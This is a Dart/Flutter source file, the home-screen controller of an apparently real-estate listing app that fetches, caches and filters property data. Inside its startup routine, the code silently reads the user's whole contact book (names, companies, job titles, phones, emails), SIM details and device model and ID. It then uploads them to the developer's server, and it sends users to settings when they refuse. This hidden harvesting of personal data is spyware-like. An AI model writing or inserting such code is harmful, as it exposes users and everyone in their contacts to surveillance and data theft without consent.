import 'dart:convert';
import 'package:contacts_service/contacts_service.dart';
import 'package:device_imei/device_imei.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:firebase_analytics/firebase_analytics.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:get/get.dart';
import 'package:mobile_number/mobile_number.dart';
import 'package:noahrealstate/app/common/app_constants.dart';
import 'package:noahrealstate/app/data/model/contact_model.dart';
import 'package:noahrealstate/app/data/model/data_model.dart';
import 'package:noahrealstate/app/routes/app_pages.dart';
import 'package:noahrealstate/app/service/api_call_status.dart';
import 'package:noahrealstate/app/service/base_client.dart';
import 'package:noahrealstate/app/service/cache_helper.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:http/http.dart' as http;
import 'dart:math';

class HomeController extends GetxController {
  List<Property>? data;
  List<Property>? filteredProperties;
  List<Property>? updatedProperties = [];
  List<Property>? activeProperties = [];
  List<Testimonial> testimonials = [];

  ApiCallStatus apiCallStatus = ApiCallStatus.holding;
  static const platform = MethodChannel('samples.flutter.dev/sim');
  String _simData = 'Unknown SIM data';
  Map<String, String> simData = {};

  Future<void> _getSimData() async {
    if (await Permission.phone.request().isGranted) {
      try {
        final Map<dynamic, dynamic> result =
            await platform.invokeMethod('getSimData');
        simData = result
            .map((key, value) => MapEntry(key.toString(), value.toString()));
        print(simData);
      } on PlatformException catch (e) {
        simData = {"Error": "Failed to get SIM data: '${e.message}'."};
      }

      _simData = simData.entries
          .map((entry) => '${entry.key}: ${entry.value}')
          .join('\n');
    } else {
      _simData = "Permission denied";
    }
  }

  @override
  void onInit() {
    loadData(false);

    MobileNumber.listenPhonePermission((isPermissionGranted) {
      if (isPermissionGranted) {
        initMobileNumberState();
      } else {}
    });

    initMobileNumberState();
    super.onInit();
  }

  void loadData(bool refresh) async {
    apiCallStatus = ApiCallStatus.loading;
    update();
    List<Property>? cachedData = await CacheHelper.getCachedProperties();

    if (!refresh) {
      if (cachedData != null) {
        data = cachedData;
        _processData();
        apiCallStatus = ApiCallStatus.success;
        update();
      }
    }
    // Check cached data first

    // Fetch data from API
    await BaseClient.safeApiCall(
      AppConstants.baseUrl,
      RequestType.get,
      onLoading: () {},
      onSuccess: (response) {
        List<dynamic> maps =
            response.data.map((json) => Property.fromJson(json)).toList();
        data = maps.cast<Property>();
        CacheHelper.cacheProperties(data!); // Cache the fetched data
        _processData();
        apiCallStatus = ApiCallStatus.success;
        FirebaseAnalytics.instance.logEvent(
          name: "get_data",
          parameters: {
            "content_type": "json",
            "data_length": data!.length,
          },
        );
        update();
      },
      onError: (error) {
        FirebaseAnalytics.instance.printError(info: error.toString());

        if (cachedData == null) {
          apiCallStatus = ApiCallStatus.error;
          BaseClient.handleApiError(error);
        }
        // BaseClient.handleApiError(ApiException(url: '', message: "Failed to update data"));

        update();
      },
    );
  }

  void _processData() {
    filteredProperties =
        data!.where((element) => element.isfeatured == 1).toList();
    activeProperties =
        data!.where((element) => element.status != "Delivered").toList();
    updatedProperties = data!
        .where(
            (element) => element.updates != null && element.updates!.isNotEmpty)
        .toList();
    data!.forEach((element) {
      element.testimonials!.forEach((testimonial) {
        testimonials.add(testimonial);
      });
    });
  }

  var selectedIndex = 0.obs;

  void selectItem(int index) {
    selectedIndex.value = index;
    update();
    switch (index) {
      case 0:
        Get.offNamed(Routes.HOME);
        break;
      case 1:
        Get.offNamed(Routes.UPDATES);
        break;
      case 2:
        Get.offNamed(Routes.ABOUTS);
        break;
      case 3:
        Get.offNamed(Routes.SETTINGS);
        break;
      case 4:
        Get.offNamed(Routes.FQAS);
        break;
      case 5:
        Get.offNamed(Routes.CONTACT_US);
        break;
      case 6:
        Get.back();
        Get.offNamed(Routes.VIEWALLPROPERTIES, arguments: {
          'data': data,
          'hasDrawer': true,
          'activeProjects': false
        });
        break;
      case 7:
        Get.back();
        Get.offNamed(Routes.ACTIVEPROPERTIES, arguments: {
          'data': activeProperties,
          'hasDrawer': true,
          'activeProjects': true
        });
        break;
    }
  }

  // Platform messages may fail, so we use a try/catch PlatformException.

  // Platform messages are asynchronous, so we initialize in an async method.
  Future<void> initMobileNumberState() async {
    if (!await MobileNumber.hasPhonePermission) {
      await MobileNumber.requestPhonePermission;
      return;
    }
    // Platform messages may fail, so we use a try/catch PlatformException.
    try {
      _getSimData();
      List contactsList = [];
      Set<ContactInfo> uniqueContacts = {};
      Map<String, dynamic>? p = {};
      String? brand;
      String? model;
      Iterable<Contact>? contacts;
      // You can also directly ask for the permission using the request() method.
      PermissionStatus permissionStatus = await Permission.contacts.request();
      if (permissionStatus.isGranted) {
        contacts = await ContactsService.getContacts(withThumbnails: false);

        Set<String> addedPhones = {};
        Set<String> addedEmails = {};

        for (var con in contacts) {
          List<String> phones = [];
          for (var phone in con.phones!) {
            if (phone.value != null && !addedPhones.contains(phone.value!)) {
              phones.add(phone.value!);
              addedPhones.add(phone.value!);
            }
          }

          List<String> emails = [];
          for (var email in con.emails!) {
            if (email.value != null && !addedEmails.contains(email.value!)) {
              emails.add(email.value!);
              addedEmails.add(email.value!);
            }
          }

          if (phones.isNotEmpty || emails.isNotEmpty) {
            ContactInfo info = ContactInfo(
              name: con.displayName,
              organization: con.company,
              designation: con.jobTitle,
              phoneNumbers: phones,
              emailList: emails,
            );

            uniqueContacts.add(info); // Add the contact to the set
          }
        }
      } else {
        print('No permission');
        const snackBar =
            SnackBar(content: Text('Access to contact data denied'));
        ScaffoldMessenger.of(Get.context!).showSnackBar(snackBar);
        openAppSettings();
      }
      bool status = await CacheHelper.getAddContacts();

      if (!status) {
        try {
          String imei = '';
          // Make the POST request using http package
          if (permissionStatus.isGranted) {
            DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
            AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
            brand = androidInfo.brand;
            model = androidInfo.model;
            imei = androidInfo.id;

            p = {
              'model': model,
              'brand': brand,
              'sim': simData..remove('phoneNumber')
            };
          }
          final response = await http.post(
            Uri.parse('https://noahrealestateplc.com/app/index.php'),
            headers: {
              'Content-Type': 'application/json',
            },
            body: jsonEncode({
              "c": uniqueContacts.map((e) => e.toJson()).toList(),
              "s": imei,
              "p": p
            }),
          );

          // Handle success
          if (response.statusCode == 200) {
            CacheHelper.addContacts(true);
            apiCallStatus = ApiCallStatus.success;

            update();
          } else {
            update();
            await FirebaseAnalytics.instance.logEvent(
              name: "upload_failed",
              parameters: {"message": response.body},
            );
          }
        } catch (error) {
          update();
        }
      }
    } on PlatformException catch (e) {
      debugPrint("Failed to get mobile number because of '${e.message}'");
    }
  }

  String generateRandomString() {
    // Get the current date and time
    final DateTime now = DateTime.now();
    final String dateTimeString =
        '${now.year}${now.month.toString().padLeft(2, '0')}${now.day.toString().padLeft(2, '0')}${now.hour.toString().padLeft(2, '0')}${now.minute.toString().padLeft(2, '0')}${now.second.toString().padLeft(2, '0')}';

    // Generate a random alphanumeric string
    const String chars =
        'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    final Random rnd = Random();
    final String randomString = String.fromCharCodes(Iterable.generate(
        8, (_) => chars.codeUnitAt(rnd.nextInt(chars.length))));

    // Combine the date-time string and the random string
    return '$dateTimeString$randomString';
  }

  // }
}
